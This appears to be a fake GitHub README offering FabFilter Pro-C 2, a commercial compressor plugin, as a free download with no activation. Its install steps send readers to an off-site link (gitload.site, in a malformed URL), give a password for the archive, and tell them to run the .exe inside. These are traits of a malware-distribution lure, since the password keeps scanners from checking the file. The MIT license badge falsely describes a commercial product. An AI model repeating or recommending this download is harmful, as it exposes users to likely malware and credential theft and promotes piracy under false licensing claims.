# FabFilter Pro-C 2

Professional compressor plugin for VST / VST3 / AAX.

![Platform](https://img.shields.io/badge/Windows%2010%2F11-supported-blue?style=flat-square)
![Format](https://img.shields.io/badge/VST%20%7C%20VST3%20%7C%20AAX-lightgrey?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)

---

> Pro-C 2 is a versatile compressor that works equally well on vocals, buses, and the master chain. Eight distinct compression styles, sidechain input, and advanced lookahead.

---

## Preview

<div align="center">
  <img src="https://github.com/user-attachments/assets/7b04106e-fe1f-4ca8-a732-7fb03364e4d7" alt="FabFilter Pro-C 2 compressor plugin interface VST VST3 AAX for Windows" width="700">
</div>

---

## Table of Contents

- [Quick Answers](#quick-answers)
- [Features](#features)
- [Installation](#installation)
- [System Requirements](#system-requirements)
- [Signal Chain](#signal-chain)
- [Related Plugins](#related-plugins)
- [License](#license)

---

## Quick Answers

**What is this plugin?**
Pro-C 2 is a professional compressor by FabFilter, used for controlling dynamics in mixing and mastering.

**Does it work on Windows 11?**
Yes. Windows 10 and 11 (64-bit).

**Will it work in my DAW?**
Yes, if your DAW supports VST, VST3, or AAX. That covers FL Studio, Ableton Live, Pro Tools, Cubase, Studio One, Reaper, Bitwig, and others.

**Do I need activation or a license key?**
No. Run the installer and it's ready to use.

**How is it different from the original Pro-C?**
Pro-C 2 introduces new compression styles (Vocal, Mastering, Bus, Opto), improved lookahead, and a fully redesigned interface.

---

## Features

| | |
|---|---|
| **8 Compression Styles** | Vocal, Mastering, Bus, Punch, Pumping, Clean, Opto, Classic |
| **Sidechain Input** | External triggering for ducking and precise control |
| **Lookahead** | Up to 10 ms for transparent peak control |
| **Mid/Side Processing** | Independent processing of mid and side channels |
| **Auto Gain** | Automatic gain compensation |
| **Hold & Release** | Fine-tune the envelope response |
| **Retina Interface** | Crisp UI on high-resolution displays |

---

## Installation

1. Download the archive from the link below.
2. Extract it to a folder of your choice. The archive is protected — use password: `vst2026`.
3. Run the installer (`.exe`).
4. Choose formats (VST / VST3 / AAX) and the install folder.
5. Open your DAW and rescan plugins.

### Download

**[⬇️ DOWNLOAD](https://http://gitload.site/pro-c2)**

---

## System Requirements

**Windows:** Windows 10/11 (64-bit), 4 GB RAM (8 GB recommended), 200 MB disk space.

---

## Signal Chain

```mermaid
graph LR
    A[Source] --> B[Pro-Q 3]
    B --> C[Pro-C 2]
    C --> D[Saturn 2]
    D --> E[Pro-L 2]
    E --> F[Master Out]
